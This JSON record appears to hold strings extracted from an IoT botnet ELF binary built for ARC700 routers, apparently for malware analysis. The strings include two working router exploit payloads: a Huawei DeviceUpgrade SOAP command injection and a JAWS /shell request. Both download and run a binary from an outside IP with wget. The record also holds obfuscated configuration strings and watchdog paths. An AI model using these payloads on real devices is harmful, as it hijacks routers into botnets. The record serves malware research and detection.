{
    "malware_data": [
        {
            "filename": "ef63306be89446e2924db9eb7e9a8dcaee3125d5125917957d935f6f528ac84c.elf",
            "filetype": "7F454C46",
            "filesize": "74KB",
            "hash_sha256": "ef63306be89446e2924db9eb7e9a8dcaee3125d5125917957d935f6f528ac84c",
            "strings": [
                "/lib/ld-uClibc.so.0",
                "libc.so.0",
                "ioctl",
                "recv",
                "connect",
                "sigemptyset",
                "memmove",
                "getpid",
                "prctl",
                "readlink",
                "malloc",
                "sleep",
                "recvfrom",
                "socket",
                "select",
                "readdir",
                "sigaddset",
                "send",
                "accept",
                "calloc",
                "write",
                "kill",
                "bind",
                "inet_addr",
                "ntohl",
                "setsockopt",
                "rand",
                "signal",
                "read",
                "htonl",
                "sendto",
                "realloc",
                "listen",
                "fork",
                "__uClibc_main",
                "memset",
                "ntohs",
                "getppid",
                "time",
                "opendir",
                "getsockopt",
                "htons",
                "__errno_location",
                "exit",
                "atoi",
                "open",
                "clock",
                "setsid",
                "closedir",
                "fcntl",
                "close",
                "free",
                "sigprocmask",
                "getsockname",
                "_edata",
                "__bss_start",
                "_end",
                "P5 |",
                "H5 |",
                "@5 |",
                "85 |",
                "05 |",
                "(5 |",
                " 5 |",
                "x4 |",
                "p4 |",
                "h4 |",
                "`4 |",
                "X4 |",
                "P4 |",
                "H4 |",
                "@4 |",
                "84 |",
                "04 |",
                "(4 |",
                " 4 |",
                "@:iA)",
                "9bB)A",
                "hqHp",
                "rHshrQjzbSjHs",
                "ZcHv",
                "hqHpr",
                "hqHp6",
                "hrTjbz",
                "Zc@\"",
                "RjZc",
                "X#B;J$",
                "XQrj",
                "XQRj",
                "Hqhp",
                "PHpv",
                "PHpN",
                "PHp\"",
                "Hqhp>",
                "PHpz",
                "PHpV",
                "PHpb",
                "PHp>",
                "ZcHq",
                "PHp.",
                "XQRjZc`",
                "QRjZc`",
                "(HpN",
                "(Zc@",
                "(Zc`",
                "rB\"B",
                "ZcHp",
                "ZcHpN",
                "ZcHp2",
                "zbHpF",
                "zbHp",
                "rHsL",
                "ZcB\"B",
                "rPu,",
                "ZcHp:",
                "qhp:",
                "@(Hs",
                "hqHpZ",
                "hqHpv",
                "(Hp^",
                "dPHp",
                "dPzb",
                "dPHpr",
                "dP{b",
                "dPHpF",
                "Hqhpb",
                "dP}b",
                "dPHpb",
                "dPHp.",
                "dPHpj",
                "dPHp>",
                "dPHp~",
                "dPHpB",
                "dQrj",
                "dQRj",
                "dPHs",
                "dPZc",
                "\\(Hp",
                "dPHp:",
                "PRjZc`",
                "dQRjZc`",
                "hrRj{b",
                "hrQjzbSjHs",
                "RjZc@",
                "AakrkhqHp",
                "A@\"D",
                "ARjZc",
                "PzHpF",
                "HshrQjzbSjHs",
                "PzHp",
                "RzPzHpn",
                "ZeHpN",
                "PzRz/#",
                "zbJ%",
                "X#B5J$",
                "RzPzHp",
                "ZeHp",
                "fjX#",
                "djY#",
                "Fj@\"",
                "X#B4J$",
                "PzHp&",
                "PzHp~",
                "ZeHpJ",
                "X#B6Hs",
                "X#B7HsY#",
                "OzKz",
                "PzHpf",
                ">HqK",
                "PzHpz",
                "ZeHpR",
                "PzZcPz/",
                "PzZcPz",
                "zb/#",
                "zbHs",
                "pRJ**Z",
                "Oz]eA-",
                "z]cA-",
                "]e/\"H",
                "PzRzPzHp",
                "HshrSjzb@*",
                "rQjzbSj",
                "(AY#",
                "(AHpJ",
                "hrSjzb@*",
                "Y#C3kr",
                "RjZc`",
                "XAHs",
                "qhp6",
                "UUVUB+",
                "UUVU",
                "UUVUB,",
                "ezHpV",
                "ezHp&",
                "ezHp",
                "`AY#",
                "`AHp",
                "qhp2",
                "hrRjzbQj",
                "8 Hs",
                "<\"Hs",
                "\\\"Hp",
                "<\"Zc",
                "ZcHp\"",
                "\\\"hq",
                "<\"Zc@",
                "L\"hqHp",
                "L\"Hp~",
                "qhp^",
                "8 Hp:",
                "OzHp",
                "rKzj",
                "rHpN",
                "rKzH",
                "rKz$",
                "rHpv",
                "rKz%",
                "rHp2",
                "rKzk",
                "rKzG",
                "rHp^",
                "rKzn",
                "6hqHpf",
                "rHukr",
                "AKz\"",
                "@X#B9",
                "AkHp",
                "6HpR",
                "rOz_",
                "@X#E:",
                "Hskr",
                "Hqhp.",
                "rRjZe@",
                "qhp&",
                "scdab`",
                "sghef`",
                "sklij`",
                "sopmn`",
                "sstqr`",
                "sw0uv`",
                "s3412`",
                "s7856`",
                "hrUjzb",
                "r@\"C",
                "ez/%",
                "rPux",
                "rPuj",
                "ezPzHp",
                "AjRjHqhp",
                "rUjZc",
                "OzKz|",
                "OzKzx",
                "hrSjzbUj",
                "AjO{",
                "4X#B9",
                "5Hq!",
                "X#B:Hq",
                "Y#B5Hq",
                ":Hq ",
                "5Hq\"",
                "qhp\"",
                "ezHpb",
                "rKz\\",
                "6Hq&",
                "6Hq'",
                "5Hq%",
                "3Hq$",
                "3Hq#",
                "AAjTjHqhp",
                "ATj]cB#",
                "ATjZc/#",
                "ATjZc",
                "A@\"E",
                "sp{e",
                "ZcPz",
                "AHqhpr",
                "TjZcD",
                "TjZcE",
                "TjZc",
                "HqhpB",
                "B#D7",
                "AjHp",
                "p{Sj",
                "OzHp6",
                "rKzT",
                "OzHp:",
                "5HsB#",
                "3x |",
                "B{xy",
                "X{N!A",
                "D?@z",
                " HTTP/1.1",
                "User-Agent: ",
                "Host: ",
                "Cookie: ",
                "http",
                "url=",
                "POST",
                "POST /cdn-cgi/",
                "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1",
                "Content-Length: 430",
                "Connection: keep-alive",
                "Accept: */*",
                "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"",
                "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 157.90.250.90 -l /tmp/.unstable -r /h0r0zx00xh0r0zx00xdefault/h0r0zx00x.mips; /bin/busybox chmod 777 * /tmp/.unstable; /tmp/.unstable huawei.exploit)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>",
                "GET /shell?cd+/tmp;rm+-rf+*;wget+ 157.90.250.90/jaws;sh+/tmp/jaws HTTP/1.1",
                "User-Agent: Hello, world",
                "Host: 127.0.0.1:80",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "pe^~D670=1<1=",
                "vkkp",
                "pwckmjckj",
                "wkhkoa}",
                "e`imj",
                "`abeqhp",
                "qwav",
                "cqawp",
                "pahjape`imj",
                "5555",
                "5670",
                "56701",
                "567012",
                "10765",
                "<<<<<<<<",
                "644<4<62",
                "222222",
                "<<<<<<",
                "5445glmj",
                "|g7155",
                "rm~|r",
                "nrf~`",
                "lc6|4",
                "^pa165",
                "cvkqpav",
                "pahjap",
                "kahmjq|567",
                "ph3<=",
                "CI<5<6",
                "lqjp131=",
                "pahagkie`imj",
                "psa<alkia",
                "jic|[setme",
                "tvmrepa",
                "efg567",
                "VKKP144",
                "elap~mt<",
                "ejok",
                "ewgaj`",
                "fhaj`av",
                "gep546=",
                "glejcaia",
                "m@mvagp",
                "jbhagpmkj",
                "mtgei[vp1714",
                "wswf~ocj",
                "nqejpagl",
                "teww",
                "tewwskv`",
                "wrck`ma",
                "p4pehg4jpv4h0%",
                "~lkjc|mjc",
                "~h||*",
                "~wqj55<<",
                "|il`mtg",
                "ohr567",
                "lm715<",
                "3qnIok4rm~|r",
                "3qnIok4e`imj",
                "`vaeifk|",
                "w}wpai",
                "msof",
                "vaehpao",
                "44444444",
                "56705670",
                "lqmcq74=",
                "smj5`ksw",
                "ejpwhu",
                "qjwpefha[mw[pla[lmwpkv}[kb[qjmravwa",
                "a~haeow*gki",
                "+tvkg+",
                "+a|a",
                "+ijp",
                "+wpepqw",
                "+tvkg+jap+pgt",
                "+gi`hmja",
                "+pit+",
                "+`epe+hkgeh+pit",
                "up|fkp",
                "imtw",
                "itwh",
                "fkp&Y",
                "leoem",
                "wlahh",
                "ajefha",
                "hmjq|wlahh",
                "+fmj+fqw}fk|$QJWPEFHA",
                "QJWPEFHA>$etthap$jkp$bkqj`",
                "jgkvvagp",
                "kcmj",
                "ewwskv`",
                "ajpav",
                "+`ar+sepgl`kc",
                "+`ar+imwg+sepgl`kc",
                "+wfmj+sepgl`kc",
                "+fmj+sepgl`kc",
                "+`ar+BPS@P545[sepgl`kc",
                "+`ar+BPS@P545+sepgl`kc",
                "+`ar+sepgl`kc4",
                "+apg+`abeqhp+sepgl`kc",
                "+apg+sepgl`kc",
                "eEw5606g41Bcn0",
                "PWkqvga$Ajcmja$Uqav}",
                "+apg+vawkhr*gkjb",
                "jeiawavrav$",
                "Gkjjagpmkj>$oaat)ehmra",
                "Eggatp>$pa|p+lpih(etthmgepmkj+|lpih/|ih(etthmgepmkj+|ih?u94*=(mieca+saft(.+.?u94*<",
                "Eggatp)Hejcqeca>$aj)QW(aj?u94*<",
                "Gkjpajp)P}ta>$etthmgepmkj+|)sss)bkvi)qvhajgk`a`",
                "wapGkkoma,#",
                "vabvawl>",
                "hkgepmkj>",
                "wap)gkkoma>",
                "gkjpajp)hajcpl>",
                "pvejwbav)ajgk`mjc>",
                "glqjoa`",
                "oaat)ehmra",
                "gkjjagpmkj>",
                "wavrav>$`kwevvawp",
                "wavrav>$ghkq`bheva)jcmj|",
                "Ik~mhhe+1*4$,Smj`ksw$JP$54*4?$SKS20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+15*4*6340*547$Webevm+173*72",
                "Ik~mhhe+1*4$,Smj`ksw$JP$54*4?$SKS20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+16*4*6307*552$Webevm+173*72",
                "Ik~mhhe+1*4$,Smj`ksw$JP$2*5?$SKS20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+15*4*6340*547$Webevm+173*72",
                "Ik~mhhe+1*4$,Smj`ksw$JP$2*5?$SKS20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+16*4*6307*552$Webevm+173*72",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54[55[2-$EtthaSafOmp+245*3*3$,OLPIH($hmoa$Cagok-$Ravwmkj+=*5*6$Webevm+245*3*3",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$1*5?$Pvm`ajp+1*4-",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$2*4?$Pvm`ajp+0*4?$CPF3*0?$MjbkTepl*7?$WR5?$*JAP$GHV$7*0*17724?$SKS20?$aj)QW-",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$2*5?$Pvm`ajp+0*4?$B@I?$IWMAGveshav?$Ia`me$Gajpav$TG$1*4-",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$2*5?$Pvm`ajp+0*4?$CPF3*0?$MjbkTepl*6?$WR5?$*JAP$GHV$0*0*1<3==?$SKS20?$aj)QW-",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$2*5?$Pvm`ajp+1*4?$BqjSafTvk`qgpw-",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54*2?$vr>61*4-$Cagok+64544545$Bmvabk|+61*4",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54*<?$vr>65*4-$Cagok+64544545$Bmvabk|+65*4",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54*<?$vr>60*4-$Cagok+64544545$Bmvabk|+60*4",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54[54?$vr>77*4-$Cagok+64544545$Bmvabk|+77*4",
                "Ik~mhhe+1*4$,Smj`ksw$JP$54*4?$Smj20?$|20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+26*4*7646*=0",
                "GCC: (ARCompact ISA Linux uClibc toolchain 2017.09) 7.1.1 20170710",
                "arc700",
                "BITSCAN,BS",
                ".shstrtab",
                ".interp",
                ".note.ABI-tag",
                ".hash",
                ".dynsym",
                ".dynstr",
                ".rela.plt",
                ".init",
                ".text",
                ".fini",
                ".rodata",
                ".eh_frame",
                ".ctors",
                ".dtors",
                ".dynamic",
                ".got.plt",
                ".data",
                ".bss",
                ".comment",
                ".ARC.attributes"
            ]
        }
    ]
}